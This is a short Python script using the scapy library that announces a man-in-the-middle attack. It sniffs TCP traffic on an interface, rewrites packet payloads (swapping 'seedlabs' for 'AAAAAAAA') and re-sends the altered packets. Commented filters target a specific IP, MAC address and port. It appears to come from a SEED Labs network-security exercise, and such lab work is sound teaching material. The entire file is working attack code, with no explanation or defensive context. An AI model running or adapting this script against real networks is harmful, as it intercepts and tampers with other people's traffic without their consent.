#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
   newpkt = IP(bytes(pkt[IP]))
   del(newpkt.chksum)
   del(newpkt[TCP].payload)
   del(newpkt[TCP].chksum)

   if pkt[TCP].payload:
       data = pkt[TCP].payload.load
       print("*** %s, length: %d" % (data, len(data)))

       # Replace a pattern
       newdata = data.replace(b'seedlabs', b'AAAAAAAA')

       send(newpkt/newdata)
   else: 
       send(newpkt)

f = 'tcp' 
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
#filter using IP address
#pkt = sniff(iface='eth0', filter='tcp and src host 10.9.0.5 and dst port 9090', prn=spoof_pkt)

#filter using MAC address
pkt = sniff(iface='eth0', filter='tcp and ether src 02:42:0a:09:00:05 and dst port 9090', prn=spoof_pkt)
